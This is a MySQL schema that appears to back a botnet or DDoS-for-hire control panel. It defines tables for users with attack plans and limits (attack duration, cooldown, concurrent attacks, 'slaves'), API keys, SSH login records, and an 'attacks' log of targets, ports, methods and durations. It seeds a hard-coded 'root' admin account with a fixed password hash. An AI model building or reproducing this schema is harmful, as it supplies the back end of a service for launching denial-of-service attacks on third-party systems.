

DROP TABLE IF EXISTS `logins`, `apiUsers`, `users`, `attacks`, `tokens`;

CREATE TABLE `logins` (
    `addressIPv4` varchar(128) DEFAULT NULL,
    `timeDate` bigint(20) DEFAULT NULL,
    `sshBanner` varchar(128) DEFAULT NULL,
    `username` varchar(64) DEFAULT NULL,
    `status` tinyint(1) DEFAULT NULL
);

CREATE TABLE `apiUsers` (
    `identity` int(10) unsigned NOT NULL AUTO_INCREMENT,
    `passphase` varchar(128) DEFAULT NULL,
    `username` varchar(64) DEFAULT 'NULL',
    `nickname` varchar(64) DEFAULT 'NULL',
    `maxtime` int(10) unsigned DEFAULT 300,
    `cooldown` int(10) unsigned DEFAULT 30,
    `concurrents` int(10) unsigned DEFAULT 3,
    PRIMARY KEY (`identity`),
    KEY `Key` (`passphase`)
);


CREATE TABLE `users` (
    `identity`      int(10) unsigned NOT NULL AUTO_INCREMENT,
    `username`      varchar(64) DEFAULT NULL,
    `password`      varchar(128) DEFAULT NULL,
    `ranks`         varchar(4096) DEFAULT NULL,
    `maxtime`       int(10) unsigned DEFAULT 300,
    `cooldown`      int(10) unsigned DEFAULT 30,
    `concurrents`   int(10) unsigned DEFAULT 3,
    `maxsessions`   int(10) unsigned DEFAULT 3,
    `newuser`       tinyint(1) DEFAULT 0,
    `theme`         varchar(128) DEFAULT 'default',
    `expiry`        bigint(20) DEFAULT NULL,
    `parent`        int(10) unsigned DEFAULT 1,
    `created`       bigint(20) DEFAULT 0,
    `updated`       bigint(20) DEFAULT 0,
    `max_slaves`    int(10) unsigned DEFAULT 0,
    `mfa`           varchar(200) DEFAULT '',
    `locked`        tinyint(1) DEFAULT 0,
    `plan`          varchar(64) DEFAULT 'not',
    `token`         varchar(128) DEFAULT '',
    `address`       varchar(128) DEFAULT '',
    PRIMARY KEY (`identity`),
    KEY `User` (`username`)
);

CREATE TABLE `attacks` (
    `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
    `target` varchar(128) DEFAULT NULL,
    `username` varchar(64) DEFAULT NULL,
    `method` varchar(64) DEFAULT NULL,
    `duration` int(10) unsigned DEFAULT NULL,
    `port` int(10) unsigned DEFAULT NULL,
    `created` bigint(20) DEFAULT NULL,
    `finish` bigint(20) DEFAULT NULL,
    `api` tinyint(1) DEFAULT 0,
    PRIMARY KEY (`id`),
    KEY `User` (`username`)
);

CREATE TABLE `tokens` (
    `token` varchar(128) DEFAULT NULL,
    `bundle` varchar(1024) DEFAULT NULL
);

INSERT INTO `users` (`identity`, `username`, `password`, `ranks`, `maxtime`, `cooldown`, `concurrents`, `maxsessions`, `newuser`, `expiry`, `theme`, `created`, `updated`) 
VALUES (NULL, 'root', '726f6f74e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855', 'eyJ1c2VybmFtZSI6InJvb3QiLCJyYW5rcyI6W3sibmFtZSI6ImFkbWluIiwic3RhdHVzIjp0cnVlfV19', 300, 15, 4, 2, 1, UNIX_TIMESTAMP('2023-01-01 12:00:00'), 'default', UNIX_TIMESTAMP(), UNIX_TIMESTAMP());


-- compiled tables format
CREATE TABLE `users` (`identity` int(10) unsigned NOT NULL AUTO_INCREMENT,`username` varchar(64) DEFAULT NULL,`password` varchar(128) DEFAULT NULL,`ranks` varchar(4096) DEFAULT NULL,`maxtime` int(10) unsigned DEFAULT 300,`cooldown` int(10) unsigned DEFAULT 30,`concurrents` int(10) unsigned DEFAULT 3,`maxsessions` int(10) unsigned DEFAULT 3,`newuser` tinyint(1) DEFAULT 0,`theme` varchar(128) DEFAULT 'default',`expiry` bigint(20) DEFAULT NULL,`parent` int(10) unsigned DEFAULT 1,`created` bigint(20) DEFAULT 0,`updated` bigint(20) DEFAULT 0,`max_slaves` int(10) unsigned DEFAULT 0,`mfa` varchar(200) DEFAULT '',`locked` tinyint(1) DEFAULT 0,PRIMARY KEY (`identity`),KEY `User` (`username`));
CREATE TABLE `attacks` (`id` int(10) unsigned NOT NULL AUTO_INCREMENT,`target` varchar(128) DEFAULT NULL,`username` varchar(64) DEFAULT NULL,`method` varchar(64) DEFAULT NULL,`duration` int(10) unsigned DEFAULT NULL,`port` int(10) unsigned DEFAULT NULL,`created` bigint(20) DEFAULT NULL,`finish` bigint(20) DEFAULT NULL,`api` tinyint(1) DEFAULT 0,PRIMARY KEY (`id`),KEY `User` (`username`));
CREATE TABLE `apiUsers` (`identity` int(10) unsigned NOT NULL AUTO_INCREMENT,`passphase` varchar(128) DEFAULT NULL,`username` varchar(64) DEFAULT "NL",`maxtime` int(10) unsigned DEFAULT 300,`cooldown` int(10) unsigned DEFAULT 30,`concurrents` int(10) unsigned DEFAULT 3,PRIMARY KEY (`identity`),KEY `Key` (`passphase`));
CREATE TABLE `logins` (`addressIPv4` varchar(128) DEFAULT NULL,`timeDate` bigint(20) DEFAULT NULL,`sshBanner` varchar(128) DEFAULT NULL,`username` varchar(64) DEFAULT NULL,`status` tinyint(1) DEFAULT NULL);
CREATE TABLE `tokens` (`token` varchar(128) DEFAULT NULL,`bundle` varchar(1024) DEFAULT NULL);